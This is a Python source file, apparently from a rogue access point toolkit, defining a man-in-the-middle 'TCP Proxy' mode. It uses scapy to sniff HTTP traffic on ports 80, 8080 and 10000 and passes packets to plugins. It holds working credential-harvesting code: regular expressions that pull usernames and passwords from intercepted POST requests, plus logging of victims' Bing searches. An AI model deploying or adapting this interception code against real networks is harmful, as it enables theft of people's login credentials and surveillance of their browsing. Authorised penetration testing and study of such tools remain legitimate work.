from collections import OrderedDict
from functools import partial
from PyQt4.QtCore import QThread,pyqtSignal
from time import sleep,asctime,strftime
import threading
from threading import Thread
import Queue
from scapy.all import *
import logging
from plugins.analyzers import *

import core.utility.constants as C
from core.main import  QtGui
from core.servers.http_handler.proxyhandler.MitmMode import MitmMode
from core.utility.collection import SettingsINI
from core.widgets.docks.dockmonitor import (
    dockTCPproxy
)
from plugins.external.scripts import *
from plugins.extension import *
from plugins.analyzers import *


class TCPProxy(MitmMode):
    Name = "TCP Proxy"
    Author = "P0cL4bs"
    Description = "Sniff for isntercept network traffic on UDP,TCP protocol get password,hash,image,etc..."
    Icon = "icons/tcpproxy.png"
    ModSettings = True
    ModType = "proxy"  # proxy or server
    def __init__(self,parent,FSettingsUI=None,main_method=None,  **kwargs):
        super(TCPProxy,self).__init__(parent)
        self.mainLayout = QtGui.QVBoxLayout()
        self.config = SettingsINI(C.TCPPROXY_INI)
        self.plugins = []
        self.main_method = main_method
        self.bt_SettingsDict = {}
        self.check_PluginDict = {}
        self.search_all_ProxyPlugins()
        # scroll area
        self.scrollwidget = QtGui.QWidget()
        self.scrollwidget.setLayout(self.mainLayout)
        self.scroll = QtGui.QScrollArea()
        self.scroll.setWidgetResizable(True)
        self.scroll.setWidget(self.scrollwidget)

        self.tabcontrol = QtGui.QTabWidget()
        self.tab1 = QtGui.QWidget()
        self.tab2 = QtGui.QWidget()
        self.page_1 = QtGui.QVBoxLayout(self.tab1)
        self.page_2 = QtGui.QVBoxLayout(self.tab2)
        self.tableLogging = dockTCPproxy()

        self.tabcontrol.addTab(self.tab1, 'Plugins')
        self.tabcontrol.addTab(self.tab2, 'Logging')

        self.TabPlugins = QtGui.QTableWidget()
        self.TabPlugins.setColumnCount(3)
        self.TabPlugins.setRowCount(len(self.plugins))
        self.TabPlugins.resizeRowsToContents()
        self.TabPlugins.setSizePolicy(QtGui.QSizePolicy.Preferred, QtGui.QSizePolicy.Preferred)
        self.TabPlugins.horizontalHeader().setStretchLastSection(True)
        self.TabPlugins.setSelectionBehavior(QtGui.QAbstractItemView.SelectRows)
        self.TabPlugins.setEditTriggers(QtGui.QAbstractItemView.NoEditTriggers)
        self.TabPlugins.verticalHeader().setVisible(False)
        self.TabPlugins.verticalHeader().setDefaultSectionSize(27)
        self.TabPlugins.setSortingEnabled(True)
        self.THeaders = OrderedDict([('Plugins', []), ('Author', []), ('Description', [])])
        self.TabPlugins.setHorizontalHeaderLabels(self.THeaders.keys())
        self.TabPlugins.horizontalHeader().resizeSection(0, 158)
        self.TabPlugins.horizontalHeader().resizeSection(1, 120)

        self.page_1.addWidget(self.TabPlugins)
        self.page_2.addWidget(self.tableLogging)
        # get all plugins and add into TabWidget
        Headers = []
        for plugin in self.plugins:
            self.bt_SettingsDict[plugin.Name] = QtGui.QPushButton(plugin.Author)
            self.check_PluginDict[plugin.Name] = QtGui.QCheckBox(plugin.Name)
            self.check_PluginDict[plugin.Name].setObjectName(plugin.Name)
            self.check_PluginDict[plugin.Name].clicked.connect(partial(self.setPluginOption, plugin.Name))
            self.THeaders['Plugins'].append(self.check_PluginDict[plugin.Name])
            self.THeaders['Author'].append({'name': plugin.Name})
            self.THeaders['Description'].append(plugin.Description)
        for n, key in enumerate(self.THeaders.keys()):
            Headers.append(key)
            for m, item in enumerate(self.THeaders[key]):
                if type(item) == type(QtGui.QCheckBox()):
                    self.TabPlugins.setCellWidget(m, n, item)
                elif type(item) == type(dict()):
                    self.TabPlugins.setCellWidget(m, n, self.bt_SettingsDict[item['name']])
                else:
                    item = QtGui.QTableWidgetItem(item)
                    self.TabPlugins.setItem(m, n, item)
        self.TabPlugins.setHorizontalHeaderLabels(self.THeaders.keys())

        # check status all checkbox plugins
        for box in self.check_PluginDict.keys():
            self.check_PluginDict[box].setChecked(self.config.get_setting('plugins', box, format=bool))

        self.mainLayout.addWidget(self.tabcontrol)
        self.layout = QtGui.QHBoxLayout()
        self.layout.addWidget(self.scroll)
        self.setLayout(self.layout)

    def setPluginOption(self, name, status):
        ''' get each plugins status'''
        # enable realtime disable and enable plugin
        if self.main_method.FSettings.Settings.get_setting('accesspoint', 'statusAP', format=bool):
            self.main_method.Thread_TCPproxy.disablePlugin(name, status)
        self.config.set_setting('plugins', name, status)

    def search_all_ProxyPlugins(self):
        ''' load all plugins function '''
        plugin_classes = default.PSniffer.__subclasses__()
        for p in plugin_classes:
            if p().Name != 'httpCap':
                self.plugins.append(p())
    def CheckOptions(self):
        self.FSettings.Settings.set_setting('mitmhandler', self.Name, self.plugin_radio.isChecked())
        if self.plugin_radio.isChecked() == True:
            self.setEnabled(True)
        else:
            self.setEnabled(False)
        self.Initialize()
    def boot(self):
        self.reactor=TCPProxyCore(str(self.parent.selectCard.currentText()), self.parent.currentSessionID)
        self.reactor.setObjectName(self.Name)
        self.reactor._ProcssOutput.connect(self.LogOutput)


class TCPProxyCore(QThread):
    _ProcssOutput = pyqtSignal(object)
    def __init__(self,interface,session):
        QThread.__init__(self)
        self.interface  = interface
        self.session    = session
        self.stopped    = False
        self.config     = SettingsINI(C.TCPPROXY_INI)

    def run(self):
        self.main()

    def sniffer(self,q):
        while not self.stopped:
            try:
                sniff(iface=self.interface,
                      filter="tcp and ( port 80 or port 8080 or port 10000)",
                      prn =lambda x : q.put(x), store=0)
            except Exception:pass
            if self.stopped:
                break

    def disablePlugin(self,name, status):
        ''' disable plugin by name '''
        plugin_on = []
        if status:
            for plugin in self.plugins:
                plugin_on.append(self.plugins[plugin].Name)
            if name not in plugin_on:
                for p in self.plugin_classes:
                    pluginconf = p()
                    if  pluginconf.Name == name:
                        self.plugins[name] = pluginconf
                        self.plugins[name].getInstance()._activated = True
                        print('Firelamb::{0:17} status:On'.format(name))
        else:
            print('Firelamb::{0:17} status:Off'.format(name))
            self.plugins.pop(self.plugins[name].Name)

    def main(self):
        self.plugins = {}
        self.plugin_classes = default.PSniffer.__subclasses__()
        for p in self.plugin_classes:
            plugin_load = p()
            self.plugins[plugin_load.Name] = plugin_load
            self.plugins[plugin_load.Name].output = self._ProcssOutput
            self.plugins[plugin_load.Name].session = self.session
        print '\n[*] Firelamb running on port 80/8080:\n'
        for name in self.plugins.keys():
            if self.config.get_setting('plugins', name, format=bool):
                self.plugins[name].getInstance()._activated = True
                print('Firelamb::{0:17} status:On'.format(name))
        print('\n')
        q = Queue.Queue()
        sniff = Thread(target =self.sniffer, args = (q,))
        sniff.start()
        while (not self.stopped):
            try:
                pkt = q.get(timeout = 0)
                for Active in self.plugins.keys():
                    if self.plugins[Active].getInstance()._activated:
                        try:
                            self.plugins[Active].filterPackets(pkt)
                        except Exception: pass
            except Queue.Empty:
              pass

    def snifferParser(self,pkt):
        try:
            if pkt.haslayer(Ether) and pkt.haslayer(Raw) and not pkt.haslayer(IP) and not pkt.haslayer(IPv6):
                return
            self.dport = pkt[TCP].dport
            self.sport = pkt[TCP].sport
            if pkt.haslayer(TCP) and pkt.haslayer(Raw) and pkt.haslayer(IP):
                self.src_ip_port = str(pkt[IP].src)+':'+str(self.sport)
                self.dst_ip_port = str(pkt[IP].dst)+':'+str(self.dport)

            if pkt.haslayer(Raw):
                self.load = pkt[Raw].load
                if self.load.startswith('GET'):
                    self.get_http_GET(self.src_ip_port,self.dst_ip_port,self.load)
                    self.searchBingGET(self.load.split('\n', 1)[0].split('&')[0])
                elif self.load.startswith('POST'):
                    header,url = self.get_http_POST(self.load)
                    self.getCredentials_POST(pkt.getlayer(Raw).load,url,header,self.dport,self.sport)
        except:
            pass

    def searchBingGET(self,search):
        if 'search?q' in search :
            searched = search.split('search?q=',1)[1]
            searched = searched.replace('+',' ')
            print 'Search::BING { %s }'%(searched)

    def getCredentials_POST(self,payload,url,header,dport,sport):
        user_regex = '([Ee]mail|%5B[Ee]mail%5D|[Uu]ser|[Uu]sername|' \
        '[Nn]ame|[Ll]ogin|[Ll]og|[Ll]ogin[Ii][Dd])=([^&|;]*)'
        pw_regex = '([Pp]assword|[Pp]ass|[Pp]asswd|[Pp]wd|[Pp][Ss][Ww]|' \
        '[Pp]asswrd|[Pp]assw|%5B[Pp]assword%5D)=([^&|;]*)'
        username = re.findall(user_regex, payload)
        password = re.findall(pw_regex, payload)
        if not username ==[] and not password == []:
            self._ProcssOutput.emit({'POSTCreds':{'User':username[0][1],
            'Pass': password[0][1],'Url':url,'destination':'{}/{}'.format(sport,dport)}})

    def get_http_POST(self,load):
        dict_head = {}
        try:
            headers, body = load.split("\r\n\r\n", 1)
            header_lines = headers.split('\r\n')
            for item in header_lines:
                try:
                    dict_head[item.split()[0]] = item.split()[1]
                except Exception:
                    pass
            if 'Referer:' in dict_head.keys():
                return dict_head ,dict_head['Referer:']
        except ValueError:
            return None,None
        return dict_head, None

    def stop(self):
        self.stopped = True
        print 'Thread::[{}] successfully stopped.'.format(self.objectName())
